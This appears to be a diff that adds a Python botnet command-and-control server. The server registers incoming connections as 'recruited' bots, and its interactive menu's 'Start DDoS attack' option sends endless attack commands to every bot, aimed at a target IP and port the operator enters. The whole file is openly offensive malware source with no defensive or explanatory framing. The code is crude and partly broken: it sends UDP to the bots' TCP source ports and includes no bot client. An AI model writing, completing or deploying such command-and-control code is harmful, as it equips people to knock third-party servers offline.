@@ -1,0 +1,91 @@
+import socket
+import threading
+import random
+import time
+
+class Bot:
+    def __init__(self, name, id, ip, port):
+        self.name = name
+        self.id = id
+        self.ip = ip
+        self.port = port
+
+    def __repr__(self):
+        return "Bot: {} ({})".format(self.name, self.id)
+
+class BotnetCommandAndControl:
+    def __init__(self, server_ip, server_port):
+        self.server_ip = server_ip
+        self.server_port = server_port
+        self.bots = []
+
+    def listen(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind((self.server_ip, self.server_port))
+        sock.listen(10)
+
+        print("Server listening on {}:{}".format(self.server_ip, self.server_port))
+
+        while True:
+            conn, addr = sock.accept()
+            threading.Thread(target=self.handle_conn, args=(conn, addr)).start()
+
+    def handle_conn(self, conn, addr):
+        print("New connection from {}:{}".format(addr[0], addr[1]))
+
+        # Verify and add bot to the list
+        name = "Bot {}".format(self.bots.__len__())
+        # Add your own verification logic here
+        id = self.bots.__len__()
+        ip = addr[0]
+        port = addr[1]
+        self.bots.append(Bot(name, id, ip, port))
+        print("{} recruited.".format(name))
+
+        # Send welcome message to new bot
+        conn.send(("Welcome, {} (ID: {})".format(name, id)).encode())
+
+    def start_attack(self, target_ip, target_port):
+        print("Starting attack on {}:{}".format(target_ip, target_port))
+
+        # Loop through bots and start attack threads
+        for bot in self.bots:
+            threading.Thread(target=self.start_attack_thread, args=(bot, target_ip, target_port)).start()
+
+    def start_attack_thread(self, bot, target_ip, target_port):
+        # Prepare a UDP socket for the attack
+        attack_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        while True:
+            # Send an attack command to the bot
+            attack_sock.sendto(("Attack {}:{}".format(target_ip, target_port)).encode(), (bot.ip, bot.port))
+            time.sleep(0.1)
+
+def main():
+    server_ip = input("Enter server IP: ")
+    server_port = int(input("Enter server port: "))
+
+    botnet_cc = BotnetCommandAndControl(server_ip, server_port)
+
+    # Start botnet command and control server
+    threading.Thread(target=botnet_cc.listen).start()
+
+    while True:
+        print("1. Start DDoS attack")
+        print("2. Exit")
+
+        choice = input("Enter choice: ")
+
+        if choice == "1":
+            target_ip = input("Enter target IP: ")
+            target_port = int(input("Enter target port: "))
+
+            # Start DDoS attack
+            botnet_cc.start_attack(target_ip, target_port)
+        elif choice == "2":
+            break
+        else:
+            print("Invalid choice.")
+
+if __name__ == "__main__":
+    main()
